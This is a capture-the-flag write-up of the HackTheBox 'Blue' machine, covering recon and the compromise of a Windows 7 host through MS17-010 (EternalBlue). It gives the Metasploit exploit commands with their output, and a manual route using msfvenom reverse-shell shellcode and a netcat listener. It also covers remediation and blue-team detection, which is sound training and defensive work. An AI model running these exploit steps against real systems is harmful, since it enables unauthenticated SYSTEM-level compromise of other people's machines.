# HackTheBox — Blue

> **OS:** Windows  ·  **Difficulty:** Easy  ·  **Date:** 2026-08-14

**Kill chain:** `SMB (445) → MS17-010 (EternalBlue) → unauthenticated RCE as SYSTEM → both flags`

---

## Overview

Blue is the archetypal "one missing patch" box. It runs **Windows 7 Professional SP1** with **SMBv1 exposed** and unpatched against **MS17-010** — the vulnerability family weaponised as *EternalBlue* and used by the WannaCry and NotPetya outbreaks in 2017. Exploitation is a single unauthenticated request that yields **NT AUTHORITY\SYSTEM** directly; there is no privilege-escalation phase because the initial exploit already lands at the highest privilege.

Technically this box is trivial. Its value as a *reporting* exercise is the opposite of a clever chain: it's about articulating **impact** and **detection** for a finding whose severity comes entirely from context — an internet-or-network-reachable, unauthenticated, no-user-interaction path to full host compromise.

---

## Recon

### Port scan

```bash
nmap -sV -sC -p- 10.129.56.4
```

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 SP1 (workgroup: WORKGROUP)
49152-49157/tcp open msrpc   Microsoft Windows RPC

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1
|   Computer name: haris-PC
|_ smb-security-mode: message_signing: disabled (dangerous, but default)
```

The fingerprint is decisive on its own: **Windows 7 SP1**, SMB (445) open, nothing else of substance. An unsupported, legacy Windows version exposing SMB is the textbook MS17-010 profile — but it must be *confirmed*, not assumed, before exploiting.

---

## Vulnerability identification

Confirm MS17-010 with the dedicated safe check before touching any exploit:

```bash
nmap -p445 --script smb-vuln-ms17-010 10.129.56.4
# or, in Metasploit:
use auxiliary/scanner/smb/smb_ms17_010
```

```
[+] 10.129.56.4:445 - Host is likely VULNERABLE to MS17-010!
                      Windows 7 Professional 7601 SP1 x64 (64-bit)
[+] The target is vulnerable.
```

Confirmed. Running the scanner first is good discipline — EternalBlue is a **kernel pool corruption** exploit and can BSOD an unpatched-but-not-vulnerable or already-implanted host. Verify before you fire.

---

## Exploitation — MS17-010 / EternalBlue

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.56.4
set LHOST <tun0-ip>
exploit
```

```
[+] 10.129.56.4:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Meterpreter session 1 opened
```

Drop to a shell and confirm privilege:

```
meterpreter > shell
C:\Windows\system32> whoami
nt authority\system
```

**SYSTEM on the first exploit.** No pivot, no escalation.

```
C:\Users\haris\Desktop> type user.txt
6c50f248…[REDACTED]

C:\Users\Administrator\Desktop> type root.txt
6728f300…[REDACTED]
```

### Manual / non-Metasploit route (recommended for OSCP-style practice)

The Metasploit module is the common path, but doing it manually teaches far more and mirrors exam constraints. The standard approach:

1. Use a public MS17-010 PoC (e.g. the `worawit/MS17-010` `zzz_exploit.py` / `eternal_blue_win7.py`).
2. Generate shellcode with `msfvenom` (e.g. `windows/x64/shell_reverse_tcp`) and embed it in the PoC's payload path.
3. Start a `nc`/`multi/handler` listener and run the PoC against 445.

Same result — SYSTEM — but you own every step and it doesn't rely on the module. Worth redoing the box this way once for the learning.

---

## Remediation

| Finding | Severity | Fix |
|---------|----------|-----|
| MS17-010 unpatched (EternalBlue) | **Critical** | Apply security update **MS17-010** immediately. It has shipped since March 2017. |
| SMBv1 enabled | High | Disable SMBv1 entirely (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`); use SMBv2/3 only. |
| End-of-life OS (Windows 7) | High | Windows 7 is out of support (EOL Jan 2020). Migrate to a supported OS; unsupported systems receive no patches. |
| SMB reachable on the network | Medium | Restrict 445/139 to required hosts via host/network firewall; never expose SMB to untrusted networks. |
| SMB signing disabled | Medium | Enable and require SMB signing to reduce relay/tampering exposure. |

**Impact narrative (the part that matters for a report):** a single unauthenticated network request, requiring no credentials and no user interaction, results in **complete compromise of the host at SYSTEM privilege**. This is the exact vulnerability behind WannaCry/NotPetya. On a flat network, one unpatched host of this type is a beachhead for organisation-wide ransomware propagation. The severity here is not about exploit sophistication — it is about the combination of *unauthenticated + remote + SYSTEM + wormable*.

---

## Detection notes (blue-team view)

MS17-010 is heavily signatured — this is where the write-up earns its keep. What a defender should see and hunt for:

- **Network / IDS:** Snort/Suricata ship mature MS17-010 and DoublePulsar signatures. The exploit's hallmark is anomalous **SMBv1 transactions** — oversized/ malformed `Trans2` and `NT Trans` requests, and the `SMB_COM_TRANSACTION2` patterns EternalBlue relies on. DoublePulsar's implant produces a characteristic **SMB ping response with a non-zero multiplex ID**.
- **SMBv1 usage itself is a signal.** In a modern environment, *any* SMBv1 traffic is worth alerting on — legitimate use is rare and the protocol should be disabled. A sudden SMBv1 session to a legacy host is a lead.
- **Host / EDR:** post-exploitation, EternalBlue runs shellcode in kernel then typically spawns a payload — watch for **anomalous child processes of `services.exe`/`lsass.exe`**, or `spoolsv.exe`/`rundll32` spawning shells, running as **SYSTEM** with network egress. A `whoami`→`nt authority\system` from a process with no interactive logon is high-signal.
- **Windows event logs:** unexpected service creation, and (if command-line/PowerShell logging is on) SYSTEM-context process execution shortly after inbound 445 activity.
- **Vulnerability-management angle:** the real detection is *preventive* — an unpatched-MS17-010 / SMBv1-enabled host should be flagged by any authenticated vuln scan or config baseline long before an attacker finds it. This finding should never survive a functioning patch/vuln-management program.

---

## Lessons

- **Fingerprint → confirm → exploit.** Even when the box name and OS scream the answer, run the safe `smb-vuln-ms17-010` check before firing a memory-corruption exploit that can crash the host.
- **Severity is context, not cleverness.** The most dangerous findings are often the least sophisticated. A report's job is to convey *impact*, and Blue is a clean case study in framing "one missing patch" as a critical, wormable, unauthenticated-SYSTEM finding.
- **Know what your exploit looks like defensively.** MS17-010 is the most-signatured SMB exploit in existence; understanding its telemetry is as valuable as knowing how to launch it.
